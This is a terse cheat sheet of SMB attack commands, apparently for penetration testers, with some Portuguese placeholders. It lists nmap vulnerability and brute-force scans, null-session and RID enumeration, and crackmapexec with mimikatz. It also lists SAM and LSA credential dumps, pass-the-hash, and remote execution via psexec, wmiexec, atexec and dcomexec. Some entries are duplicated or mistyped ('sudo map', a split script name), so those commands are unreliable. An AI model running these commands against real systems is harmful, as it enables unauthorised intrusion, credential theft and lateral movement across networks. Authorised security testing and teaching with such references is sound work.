% smb, enum

# Nmap Scan for Open SMB Shares
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 <IP_ou_range>

# Nmap scans for vulnerable SMB Servers
nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 <IP>

# Nmap find exposed Netbios serversn
sudo map -sU --script nbstat.nse -p 137 <IP>

# Nmap SMB OS Discovery
sudo nmap --script smb-os-discovery.nse <IP>

# Nmap simple Scan for SMB Shares
nmap -Pn -p 445 --script=smb-enum-shares <IP>

# Nmap NSE all scripts
nmap --script smb-* -p 139,445, <IP>

# Nmap NSE all enum scripts
nmap --script smb-enum-* -p 139,445, <IP>

# Nmap enumerate SMB Users 
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 <IP>

# Nmap Scanning for the NetBIOS Service 
nmap -sT -sU -sV <IP> -p 135,137,138,139,445 --open -oA <output_file>

# Nmap Scan for Open SMB Shares
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 <IP_ou_range>

# Nmap scans for vulnerable SMB Servers 
nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 <IP>

# nbtscan 
nbtscan -r <IP>

# enum4linux Null Session Enumeration 
enum4linux -a <IP>

# enum4linux with user and password
enum4linux -a -u <user> -p <password> <ip>

# enum4linux
enum4linux -Madl

# Nmap SMB NSE Scripts 
nmap -v -p 139,445 <IP> --script smb-os-discovery.nse

# smbclient shares listing
smbclient -L <IP>

# smbclient mount share
smbclient //MOUNT/share -I <IP> -N

# smbclient SMB Finger Printing 
smbclient -L //<IP>

# smbclient anonymous share
smbclient \\\\<IP>\\www

# smbclient Null Sessions 
smbclient \\\\<IP> \\public

# Nmap SMB OS Discovery
nmap <IP> --script smb-os-discovery.ns

# Nmap port scan 
nmap -v -p 139,445 -oG smb.txt <IP>

# nbtscan
nbtscan -r <IP_ou_range>

# Nmap find exposed Netbios servers
nmap -sU --script nbstat.nse -p 137 <IP>

# Nmap all SMB scripts scan 
nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or exter\ 2 nal or fuzzer)' --script-args=unsafe=1 <IP>

# Nmap NSE enum shares
nmap --script smb-enum-shares <IP>

# Nmap all SMB scripts authenticated scan 
nmap -sV -Pn -vv -p 445 --script-args smbuser=,smbpass= --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 <IP>

# nmblookup 
nmblookup -A <IP>

# rpcclient
rpcclient -U "" <IP>

# rpcclient
rpcclient -U "" <IP> enumdomusers

# Bash rpcclient "for loop" (Users list : https://github.com/insidetrust/statistically-likely-usernames)
for u in $(cat <users_file>); do rpcclient -U "" <IP> -N --command="lookupnames $u"; done | grep "User: 1"

# impacket enumerate SMB Users 
python /usr/share/doc/python-impacket-doc/examples/samrdump.py <IP>

# ridenum Null Sessions 
ridenum.py <IP> 500 50000 dict.txt

# Manual Null Session Testing - Windows
net use \\<IP>\IPC$ "" <particao>"

# Manual Null Session Testing - Linux
smbclient -L //<IP>

# smbclient with share and user
smbclient //<IP>/<sharename> -U <username> <password>

# smbmap with domain
smbmap -H <IP> -d <domain> -u "" -p ""

# smbmap
smbmap -H <IP>

# Impacket SmbClient
/usr/share/doc/python3-impacket/examples/smbclient.py <username>@<IP>

# SMB Mount
mount.cifs //$IP/<sharename>/ /mnt/shares/<sharename> -o username=<user>,pass=<password>

# SMB Mount script
mkdir <diretorio_local> && mount -t cifs \\\\<IP>\\www <diretorio_local> && cd <diretorio_local> && ls -las

# BruteForce with Nmap
sudo nmap --script smb-brute -p 445 <IP>

# BruteForce with ridenum
ridenum.py <IP> 500 50000 <password_wordlist> 

# Crackmapexec SMB list
crackmapexec smb -L 

# Crackmapexec local auth
crackmapexec <IP> -u <user> -H <hash> --local-auth

# Crackmapexec share
crackmapexec <IP> -u <user> -H <hash> --share

# Crackmapexec with Mimikatz
crackmapexec smb <IP_ou_range> -u <user> -p <password> --local-auth -M mimikatz

# Crackmapexec Execute Powershell
crackmapexec <IP> -u <user> -p <password> -X '$PSVersionTable'

# Crackmapexec execute command
crackmapexec <IP> -u <user> -p <password> -x whoami #Excute

# Crackmapexec SAM dump
crackmapexec -d <domain> -u <user> -p <password> --sam

# Crackmapexec memory hash dump
crackmapexec -d <domain> -u <user> -p <password> --lsa

# Curl SMB Upload file
curl --upload-file <file> -u '<user>' smb://<IP>/<sharename>/

# smbmap Download files
sudo smbmap -R Folder -H <IP> -A <FileName> -q 

# smbget Download files
smbget -R smb://IP/<share path> -U <user>

# Pass-the-Hash
echo "see https://github.com/SecureAuthCorp/impacket/pull/381 and https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/"

# ATExec
./atexec.py <dominio>/<username>:<password>@<targetName or address> "command"

# ATExec pass-the-hash
./atexec.py -hashes <LM_NT> <user>@<IP> "whoami"

# smbclient Autenticate using Kerberos
smbclient --kerberos //<domain>/<share>

# rpcclient Autenticate using Kerberos
rpcclient -k <domain>

# dcomexec
./dcomexec.py <dominio>/<username>:<password>@<targetName_or_address>

# dcomexec pass-the-hash
./dcomexec.py -hashes <LM_NT> <user>@<IP>

# psexec
./psexec.py <domain>/<username>:<password>@]<targetName_or_address>

# psexec pass-the-hash
./psexec.py -hashes <hash> <user>@<IP> 

# psexec password or pass-the-hash
psexec \\<IP> -u <user> -p <password_or_hash>

# wmiexec
./wmiexec.py <domain>/<username>:<password>@<targetName_or_address>

# wmiexec pass-the-hash (Using parameter -k you can authenticate against kerberos instead of NTLM)
./wmiexec.py -hashes <hash> <user>@<IP>
